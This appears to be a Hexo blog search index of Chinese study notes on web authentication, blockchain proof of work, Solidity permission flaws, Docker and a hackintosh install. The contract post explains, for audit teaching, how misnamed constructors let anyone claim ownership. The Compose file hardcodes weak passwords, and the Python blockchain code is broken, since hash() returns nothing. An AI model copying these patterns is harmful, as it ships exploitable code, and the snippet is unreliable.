<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Web认证授权—Cookie/Seesion Auth]]></title>
    <url>%2F2019%2F09%2F10%2FWeb%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E2%80%94Cookie%3ASeesion%20Auth%2F</url>
    <content type="text"><![CDATA[HTTP是一种没有状态的协议，它并不知道是谁访问了应用。所以服务器必须记录用户的状态，进行认证、授权，进而控制用户操作。 随着技术的发展出现了很多认证授权机制。目前，比较成熟完善的是Cookie/Session机制。近几年，由于JWT机制更好得释放了服务端的资源，也变得火热起来。不过，还不够成熟容易出现很多问题。 所以，在更高效、更安全的方案出现前，Cookie/Session机制可能仍然是将来Web认证授权的中流砥柱。 一、HTTP Basic Auth HTTP Basic Auth是最原始的认证方式。现在已经被淘汰。 （一）原理 每次请求API时都提供用户的username和password （二）优点 配合RESTful API 使用的最简单的认证方式，只需提供用户名密码即可 （三）缺点 有暴露用户名和密码给第三方客户端的风险 二、Cookie/Session Cookie/Session Auth是通用解决HTTP无状态进行认证授权的机制。通常把Session机制理解为会话（即：有状态）。 很多人区分不开Cookie与Session。下面加粗部分及结合原理部分可以仔细揣摩进行区分。谁在客户端？谁在服务端？谁携带SeesionID？两者之间什么关系？ （一）Cookie Cookie 属于一种内建于浏览器中实现状态的方式。 Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，以达到认证的目的。也是实现Session跟踪的一种方式。 Cookie另一用途：登录过一个网站，下次登录不想再输入账号怎么办？这个信息可以写到Cookie里面。访问网站的时候网站页面的脚本可以读取这个信息，自动把用户名填上。这也是Cookie的由来（Cookie英文意思是饼干，给用户的一点甜头。） （二）Session Session是在服务端保存的一个数据结构。用来跟综标识用户的状态。 三、Cookie/Session机制原理 每次HTTP请求时，客户端都会发送相应携带SeesionID的Cookie信息到服务端。进而，实现了有状态 用户在浏览器登陆之后（正确的密码，第一层认证通过），服务端为用户生成唯一的 Session ID，存储在服务端的存储服务（例如 MySql, Redis）中 该 Session ID也同时返回给浏览器，以 SESSION_ID 为 KEY 存储在浏览器的 Cookie 中 如果用户再次访问该网站，Cookie 里的 SESSION_ID 会随着请求一同发往服务端 服务端通过判断 SESSION_ID 是否已经在 Redis 中判断用户是否处于登陆状态 四、Cookie/Session应用 几乎动态网站都有用应用。 比如：淘宝买东西，下单后由于HTTP无状态所以并不知道哪个用户所操作的。所以服务器要为特定的用户创建特定的Session用于标识这个用户，并且跟踪用户。 五、Cookie/Session机制特点 数据需要客户端和服务器同时存储。（故，消耗了服务器资源） 用户进行操作时，需要带上cookie，在服务器进行验证（可能存在Cookie劫持、盗取） 有状态 六、Cookie/Session机制缺点（一）扩展性不好 如果服务器集群（或者跨域的服务导向架构）要求Session数据共享，每台服务器都能够读取Session 例如：A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，怎么实现？ 一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。 另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表 （二）希望无状态的API时-不推荐使用 在构建 API 时，开发者会发现认证方式和网页应用有一些不同，除了像 ajax 这种典型的 web 技术外，如果希望 API 是无状态的，不推荐使用 Cookie。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>认证授权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[苟若恒，何必三更眠五更起。]]></title>
    <url>%2F2019%2F09%2F03%2F%E8%8B%9F%E8%8B%A5%E6%81%92%EF%BC%8C%E4%BD%95%E5%BF%85%E4%B8%89%E6%9B%B4%E7%9C%A0%E4%BA%94%E6%9B%B4%E8%B5%B7%E3%80%82%2F</url>
    <content type="text"><![CDATA[前言 半年没有更新博客了。半年！你知道我这半年怎么过的吗？月月交着阿里云9.98的vps费用，月月懒得写blog…… 暑假结束，大三开始。真正意义上接触安全1年的时间。回顾一年实验室生活，充实又快乐。我认为，收获不仅仅是技术能力上的提升，更有意义的是自学能力和自我认知。 半年来不是啥也没干。关于Web安全认识理解更深一步。所以想分享记录出来一些总结。当然都是学习了别人的姿势，没有自己真正挖掘出来的漏洞/姿势。至于是否是造轮子，我不敢说。总之，我不是创造者，只是时长一年多的练习生。喜欢唱跳ra….zhouqicaibi！ 一叶飘零大佬的blog个性签名：苟若恒，何必三更眠，五更起。之前看到就感触颇深，事实确实如此。坚持真的太难了！所以还是要坚持写blog，记录分享学习笔记与心得。希望你我都有所收获。 Web安全梳理 以后尽量每周发一个专题或多个专题点的总结，只是把笔记整理整理并不麻烦，同时还能回顾复习一举两得。平时学习内网的利用点。以下是梳理的web安全基础点：（有一些也没有完全搞懂）]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>心得分享</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链-工作量证明Python实现]]></title>
    <url>%2F2019%2F04%2F16%2F%E5%8C%BA%E5%9D%97%E9%93%BE-%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8EPython%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[# -*- coding: utf-8 -*- &apos;&apos;&apos; 一个区块的结构 { &quot;index&quot;:0, //索引 &quot;timestamp&quot;:&quot;&quot;, //时间戳 &quot;proof&quot;:&quot;&quot;, //工作量证明 &quot;transactions&quot;:[ //交易 &quot;sender&quot;:&quot;&quot;, //交易发出者 &quot;receiver&quot;:&quot;&quot;, //交易接收者 &quot;amount&quot;:5, //交易金额 ], &quot;prehash&quot;:&quot;&quot;, //前一块区块的hash值 } &apos;&apos;&apos; import hashlib import json import time​​ class BlockChain:​​ #初始化区块链方法​ def init(self):​ self.chain = [] #区块链​ self.current_transactions = [] #交易​​ self.new_block(proof = 100, pre_hash= 1) #产生创世区块​ #创建区块方法，默认前一块hash为None（创世区块） def new_block(self, proof, pre_hash = None): block = { &apos;index&apos;:len(self.chain) + 1, #所创建区块的索引为当前区块链长度+1 &apos;timestamp&apos;: time.time(), #产生时间戳 &apos;transactions&apos;:self.current_transactions, #交易信息为当前保存的交易信息列表 &apos;proof&apos;:proof, #工作量证明 &apos;pre_hash&apos;:pre_hash or self.hash(self.chain[-1]) #前一块哈希值，[-1]代表数组最后一个元素 } self.current_transactions = [] #交易已经打包成区块，当前交易赋空 self.chain.append(block) #在区块链后面添加区块 return block #创建交易方法，传入发送者、接收者、交易金额，返回类型为int def new_transactions(self, sender, receiver, amount) -&gt;int: self.current_transactions.append( #在当前交易列表里添加 { &apos;sender&apos;:sender, &apos;receiver&apos;:receiver, &apos;amount&apos;:amount } ) return self.last_block[&apos;index&apos;] + 1 #返回上一块区块索引+1 #静态哈希计算方法 @staticmethod def hash(block): block_sring = json.dumps(block, sort_keys=True).encode()#使用json把转化成字符串，sort_keys排序 hashlib.sha256(block_sring).hexdigest() #hashlib传入参数为字符串编码后的字节数组 #特性找到最后一个区块方法 @property def last_block(self): return self.chain[-1] #工作量证明方法，简化为不是上一个区块的hash而是工作了证明 def proof_of_work(self, last_proof: int) -&gt; int: proof = 0 #从0开始 while self.valid_proof(last_proof,proof) is False: #只要无效工作量证明 proof +=1 #则proof++ print(proof) #打印proof来观察过程 return proof #判断有效工作量方法 def valid_proof(self, last_proof:int, proof:int ) -&gt;bool: guess = f&apos;{last_proof}{proof}&apos;.encode() #猜测值为上一个拼接当前 guess_hash = hashlib.sha256(guess).hexdigest() # #sleep(1) #可以来延迟更好观察工作量证明过程（挖矿） print(guess_hash) return guess_hash[0:4] == &quot;0000&quot; #如果满足以0000开头则返回1，否则返回0 &apos;&apos;&apos; if guess_hash[0:4] == &quot;0000&quot;: return True else: return False &apos;&apos;&apos; #测试工作量证明代码 if __name__ == &quot;__main__&quot;: testPow = BlockChain() testPow.proof_of_work(100)测试结果：]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊-智能合约审计——权限隐患]]></title>
    <url>%2F2019%2F03%2F25%2F%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9D%83%E9%99%90%E9%9A%90%E6%82%A3%2F</url>
    <content type="text"><![CDATA[以太坊-智能合约审计——权限隐患一、智能合约中的权限 合约拥有者(owner)：执行合约中所有函数 普通用户：只能调用约定范围内的函数 二、Solidity中函数权限 Public：函数可以被合约内部函数、继承合约、外部合约调用 Private：只能被合约内部函数调用 Internal：可以被合约内部函数以及继承合约调用 External：只能外部合约调用 注意：函数如果不限定，Solidity语言会默认设置函数为Public权限，也就是任何合约可以调用！ HCTF的ez2win题目就是利用这个点来破解得到flag 三、构造函数权限问题 Solidity编写合约和面向对象编程语言非常相似，可以用构造函数（constructor）来初始化合约对象 类似C++等语言，Solidity中构造函数是方法名和合约名字相同的函数，创建合约时会调用构造函数对状态变量进行数据初始化操作 构造函数可用的函数类型为public或internal 如果构造函数带参数，必须要放在合约下的第一个函数 pragma solidity ^0.4.16 contract Function{ Function Function() public{ //构造函数内容` }} 0.4.22版本后，solidity编译器引入了constructor关键字。以替代低版本的将合约名作为构造函数名的语法，避免程序员容易出现的编码错误。使用旧写法会出现 warning 信息。 pragma solidity ^0.4.22 contract Function{ constructor() public{​​ //初始化操作​ }​ Function test(){​​ //其他函数功能性代码​ }​ } 安全问题 构造函数之所以区别于普通函数，是因为构造函数它主要用户初始化整个合约对象，而且不能被任意用户所调用，所以一旦构造函数可以被任意用户调用时，调用者就可以获得初始化合约的权限，带来安全隐患。 ​ 1.构造名与合约名不相同 ​ 编译器0.4.22之前： ​ 构造函数的函数名默认是和合约名一致的，如果智能合约的开发者在开发过程中出现”构造函数名与合约名不一致”的现象（大小写、多加了一个s等情况），那么构造函数将不再是“构造函数”，而变为一个任意用户可以调用的普通函数，任意用户可以通过调用该函数实现对合约的初始化操作。 ​ 2.constructor函数不规范 ​ 在编译器0.4.22之后： ​ 使用了constructor来替代原先的“构造函数名与合约名必须一致”的代码编写规范，但是一些合约开发者在开发工程中往往还是会出现各种错误，例如：在constructor前面加function，或者加了function然后开头的C写成了大写，即“function Constructor(){}”,这样便使得构造函数变成了公有函数，可被人任意调用。 四、普通函数权限问题 对于一些普通函数，我们一般会使用一些修饰器来进行修饰，同时有时候也会使用public、private、internal、external来进行修饰。一些合约开发者留下“后门”，owner可以销毁任意用户的任意代币。那么如果owner被他人控制呢？]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>合约审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker-练习-搭建Wordpress]]></title>
    <url>%2F2019%2F03%2F18%2FDocker-%E7%BB%83%E4%B9%A0-%E6%90%AD%E5%BB%BAWordpress%2F</url>
    <content type="text"><![CDATA[yml文件代码：#使用版本3 version: &quot;3&quot; #两个服务：一个数据库、一个wordpress services: #数据库服务 db: image: mysql:5.7 #使用5.7的mysql,目前wordpress无法使用mysql8会出现链接数据库错误 volumes: #挂载mysql目录名字为de_data - db_data:/var/lib/mysql restart: always #设置总是重新启动 environment: #环境变量设置 MYSQL_ROOT_PASSWORD: 123456 MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress #wordpress服务 wordpress: depends_on: #设置依赖与db服务（上面的数据库服务），设置依赖后先启动db服务再启动wordpress服务 - db image: wordpress #pullwordpress镜像 volumes: #挂载wordpress目录为wp_site - wp_site:/var/www/html ports: #映射端口 - &quot;8000:80&quot; - &quot;443:443&quot; restart: always environment: #设置环境变量 WORDPRESS_DB_HOST: db:3306 #这个很关键！！！否则报错！ WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress volumes: db_data: wp_site: ​​ 最后效果图：]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker学习笔记]]></title>
    <url>%2F2019%2F03%2F11%2FDocker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Docker学习笔记整理记录Docker学习。重点学习Docker基础和Compose，实践了几个小型项目，下一步运用熟练。 一、基本概念 镜像（Image）：root文件系统（分层存储，体积小） 容器（Container）：实质是基于镜像的进程，相当于镜像的实例（在镜像基础上加一层容器运行时的存储层） 仓库（Registry）：集中存储、分发镜像的服务（包含多个仓库，每个仓库可包含多个标签） 国内加速 二、安装Docker 三、使用镜像 （一）获取镜像： docker pull [选项] [仓库地址] 仓库名：标签 如：docker pull ubuntu:14.04 （二）列出镜像： docker image ls（因镜像多层存储，可以继承、复用，故镜像体积和并非是实际硬盘消耗） 查看镜像、容器、数据卷所占用空间：docker sysytem df 悬虚镜像：新旧镜像同名，使得旧镜像被取消从而仓库名、标签都为 显示悬虚镜像：docker image ls -f dangling=true 删除悬虚镜像：docker iamge prune（悬虚镜像已经失去存在价值，可随意删除） 中间层镜像：其他镜像所依赖的镜像（不可删除） 显示中间层镜像：docker iamge ls -a 列出部分镜像：docker image ls [镜像名] 使用filter过滤：docker image ls -f since/before=xxx 列出镜像的ID：docker image ls -q 列出镜像摘要：docker iamge ls --digests 指定格式列出：docker image ls --format &quot;{ {.ID}}:{ {.Repository}}&quot; （三）删除镜像 docker iamge rm [选项][镜像] * 注：镜像可以是：长/短ID、镜像名、镜像摘要 （四）镜像构成 启动镜像：docker run --name webserver -d -p 80:80 nginx（用nginx镜像启动一个命名为webserver的容器，并映射到80端口） 进入镜像：docker exec -it [容器名字] [shell] 查看改动：docker diff [容器名字] 把容器保存为镜像：docker commit [选项] &lt;容器ID&gt; [容器名字]（给原来镜像新添加一层，形成新镜像，自己定制的黑箱镜像。慎用！） （五）镜像定制 定制每一层所添加的配置、文件来定制镜像（Dockerfile脚本一键化来快速构建） 什么是Dockerfile？其是包含了一条条命令的文本文件，每一条命令为一层，每一条命令描述该层如何构建。 Dockerfile指令详解： 1.FROM：指定基础镜像，必须有且为第一条命令。（scratch为空白镜像，不以任何系统为基础。不需要系统支持，比较适合Go语言） 2.RUN：执行命令行命令。 shell格式：命令行格式 exec格式：RUN [“可执行文件” , “参数1” , “参数2”]，像是函数调用中的格式 层数问题？ 每个shell命令一个RUN则每个命令构建一层，耗费资源！（目前最大可建127层） 解决：\换行格式化（清晰、排障），&amp;&amp;串联。 最后清理删除无关文件（比如apt缓存文件，避免镜像臃肿） 使用Dockerfile构建镜像：docker build [选项] &lt;上下文路径/URL&gt;(一般路径为”.”，代表当前路径因为Dockerfile在当前路径) build原理：远程调用Docker服务端的Docker引擎来实现。（若最后为”.”，打包本地址内容上传到Docker引擎） 用Git repo构建：docker buildhttp://github.com/twang2218/gitlab-ce-zh.git 用tar压缩包构建：docker build http://server/context.tar.gz 从标准输出中读取Dockerfile进行构建：docker build - &lt; Dockerfile（或cat Dockerfile | docker build -） 从标准输入中读取上下文压缩包进行构建：docker build - &lt; context.tar.gz （六）Dockerfile命令详解 3.COPY：复制文件 命令行：COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;...&lt;目标路径&gt; 函数调用：COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径&gt;&quot;,...&quot;&lt;目标路径&gt;&quot;] 注：原路径可以是多个，甚至可以是通配符，其规则要满足Go的filepath.Math规则 源文件的元数据都会保留！比如：读写、执行权限等 4.ADD：更高级的文件复制 &lt;源路径&gt;可以是URL或者tar压缩文件，下载后默认权限为600（最好不要用） 5.CMD：容器启动命令. shell格式：CMD &lt;命令&gt;（实际是被包装为sh -c 的参数进行执行） exec格式：CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;....]（被解析为JSON数组） 6.ENTRYPOINT：入口点（目的同CMD，指定容器启动程序及参数） shell格式： exec格式： CMD内容作为参数传到RNTRYPOINT（目的可以加后续参数） 7.ENV：设置环境变量（后续指令中可以使用环境变量，而升级只需要改变环境变量版本，利于维护Dockerfile） ENV &lt;key&gt; &lt;value&gt; ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;... 8.ARG：构建参数 ARG &lt;参数名&gt;[=&lt;默认值&gt;] ARG同EVN，但是其环境变量在容器运行时不会存在。 9.VOLUME：定义匿名卷（尽量爆出容器存储层不发生写操作） VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;路径2&quot;...] VOLUME &lt;路径&gt; 10.EXPOSE：声明端口（帮助使用者理解镜像服务的守护段，方便配置映射；运行时随机端口映射随机映射EXPOSE的端口） EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 注：仅仅声明容器打算使用什么端口，并没有实际映射端口 11.WORKDIR：指定工作目录（指定工作目录，如果没有自动创建） WORKDIR &lt;工作目录路径&gt; 保证各层的当前目录就被改为制定的目录 12.USER：指定当前用户（同WORKDIR，改变环境状态并影响以后的层。改变之后各层的执行RUN、CMD、ENRTRYPOINT这类命令的身份） USER &lt;用户名&gt;[:&lt;用户组&gt;] 13.HEALTHCHECK：健康检查 HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康的命令 HEALTHCHECK NONE：屏蔽基础镜像的健康检查 支持下列选项： –interval=&lt;间隔&gt;（两次检查间隔，默认30s） –timeout=&lt;时长&gt;（超时时间，默认30s） –retries=&lt;次数&gt;（失败次数限制，超过则unhealthy） 14.ONBUILD：为他人做嫁衣裳 ONBULID &lt;其他指令&gt;（其他指令当以当前的镜像为基础镜像 构建下一季镜像的时候才会被执行） （七）其他制作镜像的方式 1.从rootfs压缩包导入 docker import [选项] &lt;文件&gt;|&lt;URL&gt;| - [&lt;仓库名&gt;[:&lt;标签&gt;]] （压缩包可以是本地文件、远程web文件。从镜像/目录展开并直接作为镜像第一层提交） 2.Docker save 和 Docker load 将镜像保存为一个文件，然后传输到另外一个位置上，再加载进去。 Docker save [仓库名] -o [filename] 或 docker save [仓库名] | gzip &gt; filename.tar.gz 加载：docker load -i filename.tar.gz （八）镜像实现原理很多层构成，使用Uinon FS将这些不同的层结合到一个镜像中去。 四、操作容器 （一）启动 1.基于镜像新建容器并启动 启动终端：docker run -t -i unbuntu:18.04 /bin/bash -t：分配伪终端，绑定到容器的标准输入上 -i：让容器的标准输入保持打开 流程： * 检查本地是否存在指定镜像，没有就在公有仓下载 * 利用景象创建并启动一个容器 * 分配一个文件系统，并在只读的镜像层外面挂载一层可读写层 * 从宿主主机配置的网桥借口中桥街一个虚拟借口到容器中去 * 从地址池配置一个ip地址给容器 * 执行用户指定的应用程序 * 执行完毕后容器被终止 2.将终止状态的容器重启 docker container start docker container restart （二）守护态运行 后台运行，不需要直接把执行命令的结构输出在当前宿主机下 后台运行命令：docker run -d 获取容器输出的信息：docker container logs （三）终止容器 docker container stop 对于一个只启动了终端的容器，exit或ctrl+d推出终端时，所创建的容器立刻停止。 （四）进入容器 docker attach ID/名（从stdin中exit会导致容器停止） docker exec -it ID/名（从stdin中exit不会导致容器停止） （五）导出和导入容器 1.导出容器：docker export ID &gt; xxx.tar 2.导入容器：docker import URL/文件（与load区别：容器快照将丢弃所所有的历史记录和元数据可以重新指定标签元素） （六）删除容器 删除终止的容器：docker container rm xxx 删除正在运行容器：docker container rm -f xxx 清理所有终止的容器：docker container prune 五、访问仓库 （一）Docker Hub（二）私有仓库 官方工具：docker-registry （三）高级私有仓库（四）Nexus3.x的私有仓库六、数据管理 （一）数据卷（类似于linux下队目录或文件进行mount） 1.特点： 可供一个或多个容器共享使用和重用 对数据卷的修改会立马生效 对数据卷的更新不会影响镜像 数据卷默认一直存在，即使容器被删除 2.创建数据卷： docker volume create my-vol 3.查看所有的数据卷： docker volume ls 4.查看指定数据卷的信息： docker volume inspect xxx 5.启动一个挂载数据卷的容器： --mount source=xxx,target=/xxxx 6.查看容器的数据卷具体信息： docker inspect xxx 7.删除数据卷： docker volume rm xxx 8.删除容器同时删除数据卷： docker rm -v 9.清理无主的数据卷： docker volume prune （二）挂载主机目录 1.挂载主机目录为数据卷 --mount type=bind,source=/src/webapp,target=/opt/webapp（挂载主机的/sec/webapp到/opt/webapp目录） 默认权限为：读写 添加命令只读：--mount type=bind,source=/src/webapp,target=/opt/webapp,readonly 2.挂载主机文件为数据卷 --mount type=bild,source=$HOME/.bash_historytarget=/root/.bash_history（可用来记录容器输入果的命令） 七、使用网络 （一）外部访问容器 -P：随机映射49000-49900的端口 -p：指定要映射的端口（可以多次使用来绑定多个端口） 映射所有借口地址：-p 5000:5000 映射到指定地址的指定端口：-p 127.0.0.1:5000:5000 映射到指定地址的任意端口：-p 127.0.0.1:：5000 可以用udp来指定udp端口：-p 127.0.0.1:5000:5000/udp 查看映射端口配置：docker port （二）容器互联 老习惯：--link 新建网络：docker network create -d bridge my-net 注：-d参数指定Docker网络类型，有bridge、overlay（适用于Swarm mode） 链接容器： * docker run -it --rm --name busybox1 --network my-net busybos sh * docker run -it --rm --name busybox2 --network my-net busybos sh 可以使用Ping命令来证明 多个容器互联：Docker Compse （三）配置DNS Docker利用虚拟文件来挂载容器的3个相关配置文件 容器中mount命令可以看到挂载的信息（宿主主机DNS信息发生更新后，所有Docker容器的DNS配置通过/etc/resolv.conf文件立刻得到更新） 自动配置：在/etc/docker/daemon.json文件中增加以下内容 { &quot;dns&quot;:[ &quot;114.114.114.114&quot;, &quot;8.8.8.8&quot; ] } 可以使用docker run -it --rm ubuntu:18.04 cat etc/resolv.conf来证明其已经生效 手动配置： 设定主机名：-h HOSTNAME或--hostname=HOSTNAME（写到容器内的/etc/hostname和/etc/hosts） 添加DNS服务器到容器的/etc/resolv.conf中：--dns=IP_ADDRESS（让容器用这个服务器来解析所有不在/etc/hosts中的主机名） 设定容器的搜索域：--dns-search=DOMAIN 八、高级网络配置 九、Docker三剑客之Compose项目 （一）简介 Compose使用doekcer-compose.yml模板文件来管理项目（Python编写，只要支持Docker API就可用） 服务：一个应用容器（可包含若干运行相同镜像的容器实例） 项目：应用容器组成的完整业务单元 （二）安装卸载 Python pip：sudo pip install -U docker-compose（卸载：sudo pip uninstall docker-compose） curl下载后，改成执行权限：chmod +x /usr/local/bin/docker-compse（卸载：sudo rm /usr/local/bin/docker-compose） 容器中执行 （三）使用 1.写好每个容器的Dockerfile 2.写好yml链接文件 3.docker-compose up （四）命令说明 1.命令对象：默认项目（项目中所有的服务都会受影响），也可为项目中的服务或容器 2.帮助：--help 3.命令格式：docker-compse [-f=...] [options] [COMMAND] [ARGS...] -f:指定Compse模版文件，默认为docker-compose.yml -p:指定项目名称，默认将使用所在目录名 --x-networking:Docker：的可拔插网络后端特性 --x-network-driver DRIVER:指定网络后端的驱动，默认为bridge --verbose：输出更多调试信息 -v：打印版本信息 4.build docker-compose build [option] [SERVICE...] 构建（重新构建）项目中的服务容器（可随时重新构建项目） --fore-rm：删除构建过程中的临时容器 --no-cache：构建过程不使用cache（chche加长构建过程） --pull：始终尝试通过pull来获取更新版本的镜像 5.config 验证Compose文件格式是否正常（正确显示匹配，错误显示原因） 6.down 停止up命令所启动的容器，并移除网络 7.exec 进入指定的容器 8.help 9.images 列出Compose文件中包含的镜像 10.kill Docker-compose kill [option] [SERVICE...] 发送DIGKILL信号来强制停止服务容器 -s：指定发送的信号 11.logs docker-compose logs [][] 查看服务器的输出（默认使用不同颜色区分，–no-color来关闭颜色） 12.pause docker-compose pause [] 暂停一个服务容器 13.port docker-compose port [ ] 打印某个容器端口所映射的公共端口 --protocol=proto:指定端口协议，默认tcp可指定udp --index=index：指定命令容器的序号 14.ps 列出项目所有容器 -q：只打印ID 15.pull docker-compose pull [][] 拉取服务依赖的镜像 --ignore-pull-failures：忽略拉取镜像过程中的错误 16.push 推送服务依赖的镜像到Docker镜像仓库 17.restart docker-compose restart [][] 重启 -t：重启前停止容器的超时 18.rm docker-compose rm [][] 删除所有（停止状态的）服务容器 -f：强制直接删除 -v：删除容器所挂在的数据卷 19.run docker-compose run [option] [-p PORT...] [-e KEY=VAL...] SERVOCE [COMMAND][ARGS...] 在指定服务上执行一个命令，默认启动关联容器（–no–deps关闭） -d：后台运行容器 --name NAME：为容器指定一个名字 --entrypoint CMD：覆盖默认的容器启动指令 -e KEY=VAL： 设置环境变量值，可多次使用选项来设置多个环境变量 -u：指定运行容器的用户名或uid --no-deps：关闭自动启动关联 --rm：运行命令后自动删除容器，d模式下将忽略 -p：映射容器端口到本地主机 --service-ports：配置服务端口并映射到本地主机 -T：不分配伪tty（tty命令无法执行） 20.scale docker-compse scale [optins][service=$num] 设置指定服务运行的容器个数 -t：停止容器时超时 21.start docker-compose start [] 启动已经存在的服务容器 22.stop docker-compose stop [][] 停止运行的容器 -t：停止容器的时候超时 23.top 查看各个服务器内运行的进程 24.unpause docker-compose unpause [] 恢复暂停的服务 25.up docker up [][] 自动构建镜像、（重新）创建服务、启动服务、关联服务相关容器 Ctrl+c停止所有容器 若服务容器已经存在，则尝试停止所有容器并重新创建 -d：在后台启动并运行所有容器 --no-color：不使用颜色来区分不同的服务的通知台输出 --no-deps：不启动服务器所链接的容器 --force-recreate：强制重新创建容器 --no-recreate：如果容器已经存在则不重新创建 --no-build：不自动构建缺失的服务镜像 -t：停止容器的时候超时 26.version 打印版本信息 （五）yml模版文件 默认YAML格式的docker-compose.yml 注意：每个服务必须通过image指令指定镜像或build指令（需要Dockerfile）等来自动构建生成镜像 如果使用build指令，在Dockerfile中设置的选项（如：CMD、EXPOSE、VOLUME、ENV等）将会自动被获取无需再Docfile.yml文件中再次设置 1.build 指定Dockerfile所在文件夹的路径（绝对或相对yml） 也可以：context指令指定Dockerfile所在文件夹的路径 ，使用dockerfile指令指定Docfile文件名，args指令指定构建镜像时的变量、chahce_from指定构建镜像的缓存 2.cap_add/cap_drop 指定容器的内核能力（capacity）分配 拥有所有能力： cap_add: -ALL 去掉NET_ADMIN能力： cap_drop: -NET_ADMIN 3.command 覆盖容器启动后默认执行的命令 4.configs 仅用于Swarm mode 5.cgroup_parent 指定父cgroup组，继承该组的资源限制 6.container_name 指定容器名称，默认：项目名称-服务名称-序号 container_name: docker-web-container 7.deploy 仅用于Swarm mode 8.devices 指定设备映射关系 9.depends_on 解决容器的依赖和启动先后问题，先启动depends_on。 10.dns 自定义DNS服务器，可以是值、列表 11.dns_search 配置DNS搜索域，可以是值、列表 12.tmpfs 挂载一个tmpfs文件系统到容器 13.env_file 从文件中获取环境变量，可以为单独的文件路径或列表（若-f指定模版文件则变量的路径基于模版文件） 注：环境变量文件中每一行必须符合格式 14.environment 设置环境变量，支持数组或字典格式 只给定名称的变量会自动获取运行Compose主机上对应变量的值，可以防止泄漏不必要的数据 15.expose 暴漏端口，但不映射到宿主机，只被链接的服务访问 16.external_links 链接yml外部的容器 17.extra_hosts 指定额外的host名称映射信息 18.healthcheck 通过命令检查容器是否健康运行 19.image 指定为镜像名称或ID 20.labels 为容器添加Docker元数据（metadata）信息 21.links 不推荐使用 22.logging 配置日志选项 dirver:支持三种日志驱动类型：&quot;json-file&quot;,&quot;syslog&quot;,&quot;none&quot; options:配置日志驱动的相关参数 23.network_mode 设置网络模式 24.networks 配置容器链接的网络 25.pid 跟主机系统共享进程命名空间 26.ports 暴漏端口信息 27.secrets 存储敏感数据，如mysql服务密码 28.security_opt 指定容器模版标签（label）机制的默认属性（用户、角色、类型、级别等） 29.stop_signal 设置另一个信号来停止容器，默认SIGUSR1 30.sysctls 配置容器内核参数 31.ulimits 指定容器的ulimits限制值 32.volumes 数据卷所挂载路径设置 可设置宿主机路径（HOST：CONTAINER）或加上访问模式（HOST：CONTSAINER：ro） 33.其他 基本与docker run中对应参数的功能一致 34.读取变量 Compose模版文件支持动态读取主机的系统环境变量和当前目录下的.env文件中的变量 十、Docker三剑客之Machine项目 十一、Docker三剑客之Docker Swarm项目 十二、安全 十三、底层实现]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTFer的黑苹果安装与配置心得]]></title>
    <url>%2F2019%2F03%2F10%2FCTFer%E7%9A%84%E9%BB%91%E8%8B%B9%E6%9E%9C%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[0x01.前言 水文一篇。 ​ 大表哥们都用Mac，小老弟还在用Win10。 自己不算忠实果粉也算半个了吧，深知苹果系统的强大、流畅、好用，着实眼红，但是又没钱买。。。所以，经先进表哥指导，搞了个黑苹果。 ​ 开学第一周，每晚在床上都是看关于黑苹果的东西，从一无所知到浅浅明白。 ​ 由于先进表哥经验丰富，过程还算顺利，一天多就搞定了。当然，中间也遇到了很多麻烦。 ​ 安装成功只是成功吃到黑苹果的一半。由Win切换到Mac，软件破解、环境配置等等更麻烦。 ​ 收获也很多。记录下来，自己加深记忆的同时也供大家参考吧。 0x02.黑苹果安装历程 后续记忆写的，没有截图。凑合读吧。 ​ 1.爬帖子爬帖子爬帖子 推荐几个个不错的： ​ - 微信公众号：悦享软件（包含镜像、工具、EFI文件） ​ - 远景论坛：http://bbs.pcbeta.com/（主要是搜集信息，下载附件需要注册，但已经无法注册，可以淘宝买） ​ - 黑果小兵：https://blog.daliansky.net/（colcer工具使用及其他问题解决办法） ​ - 国光博客：https://www.sqlsec.com/（一名ctfer，主要是教程及安装流程） ​ 所有关于黑苹果的文章都看完之后加上观看教程视频等，基本知道大体流程及注意事项了。 ​ 2.下载镜像，制启动盘 